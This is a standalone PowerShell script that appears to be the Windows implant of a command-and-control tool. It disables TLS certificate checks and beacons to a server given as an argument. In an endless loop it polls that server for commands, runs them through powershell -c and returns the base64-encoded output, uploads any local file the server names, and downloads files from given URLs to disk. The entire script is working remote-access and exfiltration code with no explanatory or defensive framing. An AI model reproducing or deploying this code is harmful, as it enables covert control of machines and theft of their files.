add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$ProgressPreference = 'SilentlyContinue' 


$id=$Args[0]
$url=$Args[1]

$a = "Hello From Agent"
$b = "(Windows)"
$Hello = "$($a) $($id) $($b)"
$EncHelloBytes = [System.Text.Encoding]::UTF8.GetBytes($Hello)
$EncHello = [System.Convert]::ToBase64String($EncHelloBytes)

$hello=(Invoke-WebRequest "$url/default.php?m=res&res=$EncHello&id=$id")

while($true)
{

$Content=(Invoke-WebRequest "$url/default.php?m=cmds&id=789&o=W").Content

if ([string]::IsNullOrWhiteSpace($Content))
    {
		Start-Sleep -Seconds 10
        continue
    }

$Content= $Content.Split(
    @("`r`n", "`r", "`n"), 
   [StringSplitOptions]::None)

if ([string]::IsNullOrWhiteSpace($Content))
    {
		Start-Sleep -Seconds 10
        continue
    }

ForEach ($line in $Content)
{
	$cmd = Select-String -pattern "$id" -InputObject $line
	if ([string]::IsNullOrWhiteSpace($cmd))
        {
        continue
        }
	$act = ($cmd -split ':',3)[1]
if ($act -eq "run")
    {
	$cmd = ($cmd -split ':',3)[-1]
	if ([string]::IsNullOrWhiteSpace($cmd))
    {
	
        continue
    }
	$Output = (powershell -c $cmd 2>&1)
	if ([string]::IsNullOrWhiteSpace($Output))
    {	
	$EncOutputBytes = [System.Text.Encoding]::UTF8.GetBytes("Command executed but no Output")
        $EncOutput = [System.Convert]::ToBase64String($EncOutputBytes)
	$gimme=(Invoke-WebRequest "$url/default.php?m=res&res=$EncOutput&id=$id")
        continue
    }
	$EncOutputBytes = [System.Text.Encoding]::UTF8.GetBytes($Output)
        $EncOutput = [System.Convert]::ToBase64String($EncOutputBytes)
        $gimme=(Invoke-WebRequest "$url/default.php?m=res&res=$EncOutput&id=$id")
}  
if ($act -eq "download")
{
$file = ($cmd -split ':',3)[-1]
	if ([string]::IsNullOrWhiteSpace($file))
    {
	
        continue
    }
$f = Split-Path $file -leaf
$fileBytes = [System.IO.File]::ReadAllBytes($file);
$fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
$boundary = [System.Guid]::NewGuid().ToString(); 
$LF = "`r`n";

$bodyLines = ( 
    "--$boundary",
    "Content-Disposition: form-data; name=`"data`"; filename=`"$f`"",
    "Content-Type: application/octet-stream$LF",
    $fileEnc,
    "--$boundary--$LF" 
) -join $LF

$c = "Uploading "
$d = "$($c) $($file)"

$EncdBytes = [System.Text.Encoding]::UTF8.GetBytes($d)
$Encd = [System.Convert]::ToBase64String($EncdBytes)

$resup=(Invoke-WebRequest "$url/default.php?m=res&res=$Encd&id=$id")
$up=(Invoke-RestMethod -Uri "$url/default.php?m=up&id=$id" -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines)



}

if ($act -eq "upload")
{
$urldl = ($cmd -split ':',5)[2,3]
$urldl = ($urldl -join ":")

	if ([string]::IsNullOrWhiteSpace($urldl))
    {
	
        continue
    }

$path = ($cmd -split ':',5)[-1]


$c = "Downloading "
$d = "$($c) $($urldl) $($path)"

$EncdBytes = [System.Text.Encoding]::UTF8.GetBytes($d)
$Encd = [System.Convert]::ToBase64String($EncdBytes)

$resup=(Invoke-WebRequest "$url/default.php?m=res&res=$Encd&id=$id")
$down= (Invoke-WebRequest -Uri $urldl -OutFile $path)


}
}
}
